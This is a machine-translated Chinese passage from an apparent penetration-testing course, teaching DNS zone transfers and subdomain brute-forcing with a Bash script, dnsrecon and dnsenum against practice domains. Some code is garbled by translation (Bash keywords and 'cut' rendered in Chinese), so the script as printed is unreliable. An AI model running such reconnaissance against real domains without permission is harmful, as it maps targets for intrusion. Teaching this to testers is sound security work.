<div style="position:absolute;top:208295;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">组织可能托管许多 DNS 服务器，或者我们可能想要尝试区域传输请求</font></font></nobr></div>
<div style="position:absolute;top:208314;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">针对给定域中的所有 DNS 服务器。</font><font style="vertical-align: inherit;">Bash 脚本可以帮助完成这项任务。</font></font></nobr></div>
<div style="position:absolute;top:208347;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">要尝试使用</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">host</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">命令</font><font style="vertical-align: inherit;">进行区域传输</font><font style="vertical-align: inherit;">，我们需要两个参数：名称服务器</font></font></nobr></div>
<div style="position:absolute;top:208366;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">地址和域名。</font><font style="vertical-align: inherit;">我们可以使用以下命令获取给定域的名称服务器</font></font></nobr></div>
<div style="position:absolute;top:208386;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">命令：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:208420;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">host -t ns megacorpone.com | </font><font style="vertical-align: inherit;">剪切 -d " " -f 4</font></font></font></b></nobr></div>
<div style="position:absolute;top:208438;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ns1.megacorpone.com。</font></font></nobr></div>
<div style="position:absolute;top:208454;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ns2.megacorpone.com。</font></font></nobr></div>
<div style="position:absolute;top:208471;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ns3.megacorpone.com。</font></font></nobr></div>
<div style="position:absolute;top:208491;left:254"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 220 - 使用主机获取给定域名的 DNS 服务器</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:208520;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">更进一步，我们可以编写一个 Bash 脚本来自动化识别</font></font></nobr></div>
<div style="position:absolute;top:208539;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">相关的名称服务器并尝试从每个服务器进行区域传输：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:208574;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">#!/bin/bash</font></font></nobr></div>
<div style="position:absolute;top:208608;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"># 简单的区域传输 Bash 脚本</font></font></nobr></div>
<div style="position:absolute;top:208625;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"># $1 是 bash 脚本后给出的第一个参数</font></font></nobr></div>
<div style="position:absolute;top:208642;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"># 检查是否给出了参数，如果没有，打印用法</font></font></nobr></div>
<div style="position:absolute;top:208676;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">如果 [ -z "$1" ]; </font><font style="vertical-align: inherit;">然后</font></font></nobr></div>
<div style="position:absolute;top:208693;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">echo "[*] 简单区域传输脚本"</font></font></nobr></div>
<div style="position:absolute;top:208710;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">echo "[*] 用法 : $0 &lt;域名&gt; "</font></font></nobr></div>
<div style="position:absolute;top:208727;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">退出 0</font></font></nobr></div>
<div style="position:absolute;top:208744;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">菲</font></font></nobr></div>
<div style="position:absolute;top:208778;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"># 如果给出参数，确定域的 DNS 服务器</font></font></nobr></div>
<div style="position:absolute;top:208812;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">对于 $(host -t ns $1 | cut -d " " -f4) 中的服务器；</font><font style="vertical-align: inherit;">做</font></font></nobr></div>
<div style="position:absolute;top:208829;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"># 对于这些服务器中的每一个，尝试区域传输</font></font></nobr></div>
<div style="position:absolute;top:208846;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">host -l $1 $server |grep "有地址"</font></font></nobr></div>
<div style="position:absolute;top:208863;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">完毕</font></font></nobr></div>
<div style="position:absolute;top:208882;left:324"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 221 - 我们的 Bash DNS 区域传输脚本</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:208912;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">让我们使脚本可执行并针对 megacorpone.com 运行它。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:208946;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">chmod +x dns-axfr.sh</font></font></font></b></nobr></div>
<div style="position:absolute;top:208980;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">./dns-axfr.sh megacorpone.com</font></font></font></b></nobr></div>
<div style="position:absolute;top:208997;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">admin.megacorpone.com 的地址为 38.100.193.83</font></font></nobr></div>
<div style="position:absolute;top:209014;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">beta.megacorpone.com 的地址为 38.100.193.88</font></font></nobr></div>
<div style="position:absolute;top:209031;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">fs1.megacorpone.com 的地址为 38.100.193.82</font></font></nobr></div>
<div style="position:absolute;top:209048;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">intranet.megacorpone.com 的地址为 38.100.193.87</font></font></nobr></div>
<div style="position:absolute;top:209065;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">mail.megacorpone.com 的地址为 38.100.193.84</font></font></nobr></div>
<div style="position:absolute;top:209082;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">mail2.megacorpone.com 的地址为 38.100.193.73</font></font></nobr></div>
<div style="position:absolute;top:209099;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ns1.megacorpone.com 的地址为 38.100.193.70</font></font></nobr></div>
<div style="position:absolute;top:209116;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ns2.megacorpone.com 的地址是 38.100.193.80</font></font></nobr></div>
<div style="position:absolute;top:209133;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ns3.megacorpone.com 的地址为 38.100.193.90 </font></font></nobr></div>
</span></font>

<div style="position:absolute;top:209263;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="177"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 177 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:209296;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:210373;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:210373;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:210373;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">177</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:209392;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">router.megacorpone.com 的地址是 38.100.193.71</font></font></nobr></div>
<div style="position:absolute;top:209408;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
<div style="position:absolute;top:209428;left:300"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 222 - 运行 DNS 区域传输 Bash 脚本</font></font></i></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:18px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:209459;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">7.1.6 Kali Linux 中的相关工具</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:209497;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Kali Linux 中有几个工具可以自动进行 DNS 枚举。</font><font style="vertical-align: inherit;">两个值得注意的例子</font></font></nobr></div>
<div style="position:absolute;top:209516;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">是</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">DNSRecon</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">和</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">DNSenum</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">，它们具有我们将在以下部分中探讨的有用选项。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:16px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:209551;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">7.1.6.1 DNSRecon</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:209585;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">DNSRecon </font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">193</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">是一个用 Python 编写的高级现代 DNS 枚举脚本。</font><font style="vertical-align: inherit;">跑步</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:13px;font-family:Times">
<div style="position:absolute;top:209605;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">dnsrecon</font></font></b><font style="font-size:14px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">对megacorpone.com使用</font></font></font><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-d</font></font></b><font style="font-size:14px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">选项来指定一个域名，</font></font></font><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-t</font></font></b><font style="font-size:14px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">至</font></font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:209624;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">指定要执行的枚举类型（在本例中为区域传输），产生以下结果</font></font></nobr></div>
<div style="position:absolute;top:209643;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">输出：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:209678;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">dnsrecon -d megacorpone.com -t axfr</font></font></font></b></nobr></div>
<div style="position:absolute;top:209695;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[*] 为区域传输测试 NS 服务器</font></font></nobr></div>
<div style="position:absolute;top:209712;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[*] 检查 megacorpone.com 名称服务器的区域转移</font></font></nobr></div>
<div style="position:absolute;top:209729;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[*] 解析 SOA 记录</font></font></nobr></div>
<div style="position:absolute;top:209746;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[+] SOA ns1.megacorpone.com 38.100.193.70</font></font></nobr></div>
<div style="position:absolute;top:209763;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[*] 解析 NS 记录</font></font></nobr></div>
<div style="position:absolute;top:209780;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[*] 发现 NS 服务器：</font></font></nobr></div>
<div style="position:absolute;top:209797;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[*] NS ns1.megacorpone.com 38.100.193.70</font></font></nobr></div>
<div style="position:absolute;top:209814;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[*] NS ns2.megacorpone.com 38.100.193.80</font></font></nobr></div>
<div style="position:absolute;top:209831;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[*] NS ns3.megacorpone.com 38.100.193.90</font></font></nobr></div>
<div style="position:absolute;top:209848;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[*] 删除任何重复的 NS 服务器 IP 地址...</font></font></nobr></div>
<div style="position:absolute;top:209865;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[*]</font></font></nobr></div>
<div style="position:absolute;top:209882;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[*] 尝试 NS 服务器 38.100.193.80</font></font></nobr></div>
<div style="position:absolute;top:209899;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[+] 38.100.193.80 有端口 53 TCP 打开</font></font></nobr></div>
<div style="position:absolute;top:209916;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[+]</font></font><b><font color="#c00000"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">区域转移成功！！</font></font></font></b></nobr></div>
<div style="position:absolute;top:209933;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[*] NS ns1.megacorpone.com 38.100.193.70</font></font></nobr></div>
<div style="position:absolute;top:209950;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[*] NS ns2.megacorpone.com 38.100.193.80</font></font></nobr></div>
<div style="position:absolute;top:209966;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[*] NS ns3.megacorpone.com 38.100.193.90</font></font></nobr></div>
<div style="position:absolute;top:209983;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[*] MX @.megacorpone.com fb.mail.gandi.net 217.70.178.215</font></font></nobr></div>
<div style="position:absolute;top:210001;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[*] MX @.megacorpone.com fb.mail.gandi.net 217.70.178.217</font></font></nobr></div>
<div style="position:absolute;top:210018;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[*] MX @.megacorpone.com fb.mail.gandi.net 217.70.178.216</font></font></nobr></div>
<div style="position:absolute;top:210034;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[*] MX @.megacorpone.com spool.mail.gandi.net 217.70.178.1</font></font></nobr></div>
<div style="position:absolute;top:210051;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[*] admin.megacorpone.com 38.100.193.83</font></font></nobr></div>
<div style="position:absolute;top:210068;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[*] 一个 fs1.megacorpone.com 38.100.193.82</font></font></nobr></div>
<div style="position:absolute;top:210085;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[*] www2.megacorpone.com 38.100.193.79</font></font></nobr></div>
<div style="position:absolute;top:210102;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[*] 一个 test.megacorpone.com 38.100.193.67</font></font></nobr></div>
<div style="position:absolute;top:210119;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[*] ns1.megacorpone.com 38.100.193.70</font></font></nobr></div>
<div style="position:absolute;top:210136;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[*] ns2.megacorpone.com 38.100.193.80</font></font></nobr></div>
<div style="position:absolute;top:210153;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[*] ns3.megacorpone.com 38.100.193.90</font></font></nobr></div>
<div style="position:absolute;top:210170;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
<div style="position:absolute;top:210187;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[*]</font></font></nobr></div>
<div style="position:absolute;top:210204;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[*] 尝试 NS 服务器 38.100.193.70</font></font></nobr></div>
<div style="position:absolute;top:210221;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[+] 38.100.193.70 有端口 53 TCP 打开</font></font></nobr></div>
<div style="position:absolute;top:210238;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[-] 区域传输失败！</font></font></nobr></div>
<div style="position:absolute;top:210255;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[-] 无应答或 RRset 不适用于 qname</font></font></nobr></div>
<div style="position:absolute;top:210272;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[*]</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:210323;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">193 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（darkoperator，2019），https://github.com/darkoperator/dnsrecon</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:210451;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="178"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 178 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:210484;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:211561;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:211561;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:211561;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">178</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:210580;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[*] 尝试 NS 服务器 38.100.193.90</font></font></nobr></div>
<div style="position:absolute;top:210596;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[+] 38.100.193.90 有端口 53 TCP 打开</font></font></nobr></div>
<div style="position:absolute;top:210613;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[-] 区域传输失败！</font></font></nobr></div>
<div style="position:absolute;top:210630;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[-] 无应答或 RRset 不适用于 qname</font></font></nobr></div>
<div style="position:absolute;top:210650;left:300"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 223 - 使用 dnsrecon 执行区域传输</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:210679;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">根据上面的输出，我们已经成功地针对</font></font></nobr></div>
<div style="position:absolute;top:210699;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">megacorpone.com 域。</font><font style="vertical-align: inherit;">结果基本上是域的区域文件的完整转储。</font></font></nobr></div>
<div style="position:absolute;top:210731;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">让我们尝试使用我们之前为转发创建的 list.txt 文件来暴力破解额外的主机名</font></font></nobr></div>
<div style="position:absolute;top:210751;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">查找。</font><font style="vertical-align: inherit;">该列表如下所示：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:210785;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">cat list.txt</font></font></font></b></nobr></div>
<div style="position:absolute;top:210803;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">万维网</font></font></nobr></div>
<div style="position:absolute;top:210820;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">FTP</font></font></nobr></div>
<div style="position:absolute;top:210837;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">邮件</font></font></nobr></div>
<div style="position:absolute;top:210853;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">哇</font></font></nobr></div>
<div style="position:absolute;top:210870;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">代理人</font></font></nobr></div>
<div style="position:absolute;top:210887;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">路由器</font></font></nobr></div>
<div style="position:absolute;top:210907;left:252"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 224 - 使用 dnsrecon 进行子域暴力破解的列表</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:210936;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">为了开始蛮力尝试，我们将使用</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-d</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">选项指定域名，</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-D</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">指定</font></font></nobr></div>
<div style="position:absolute;top:210956;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">包含潜在子域字符串的文件名，以及</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-t</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">指定枚举类型</font></font></nobr></div>
<div style="position:absolute;top:210975;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">执行（在本例中为</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">brt</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">为蛮力）：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:211010;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">dnsrecon -d megacorpone.com -D ~/list.txt -t brt</font></font></font></b></nobr></div>
<div style="position:absolute;top:211027;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[*] 对 megacorpone.com 执行主机和子域蛮力</font></font></nobr></div>
<div style="position:absolute;top:211044;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[*] 路由器.megacorpone.com 38.100.193.71</font></font></nobr></div>
<div style="position:absolute;top:211061;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[*] www.megacorpone.com 38.100.193.76</font></font></nobr></div>
<div style="position:absolute;top:211078;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[*] 邮箱.megacorpone.com 38.100.193.84</font></font></nobr></div>
<div style="position:absolute;top:211095;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[+] 找到 3 条记录</font></font></nobr></div>
<div style="position:absolute;top:211114;left:305"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 225 - 使用 dnsrecon 暴力破解主机名</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:211144;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们的蛮力尝试已经完成，我们已经设法解析了一些主机名。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:16px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:211178;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">7.1.6.2 DNS枚举</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:211212;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">DNSEnum 是另一种流行的 DNS 枚举工具。</font><font style="vertical-align: inherit;">要显示不同的输出，让我们运行</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">dnsenum</font></font></font></b></nobr></div>
<div style="position:absolute;top:211232;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">针对</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">zonetransfer.me</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">域（该域归 DigiNinja </font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">194</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">所有，</font><font style="vertical-align: inherit;">并且特别允许 zone</font></font></nobr></div>
<div style="position:absolute;top:211251;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">转移）：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:211286;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">dnsenum zonetransfer.me</font></font></font></b></nobr></div>
<div style="position:absolute;top:211303;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">dnsenum.pl 版本：1.2.2</font></font></nobr></div>
<div style="position:absolute;top:211320;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">----- zonetransfer.me -----</font></font></nobr></div>
<div style="position:absolute;top:211354;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">主机地址：</font></font></nobr></div>
<div style="position:absolute;top:211371;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">__________________</font></font></nobr></div>
<div style="position:absolute;top:211405;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">zonetransfer.me    </font></font></nobr></div>
<div style="position:absolute;top:211405;left:441"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">7200 英寸    </font></font></nobr></div>
<div style="position:absolute;top:211405;left:635"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">217.147.180.162</font></font></nobr></div>
<div style="position:absolute;top:211456;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">名称服务器：</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:211511;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">194 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">(DigiNinja), https://digi.ninja/about.php</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:211639;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="179"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 179 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:211672;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:212749;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
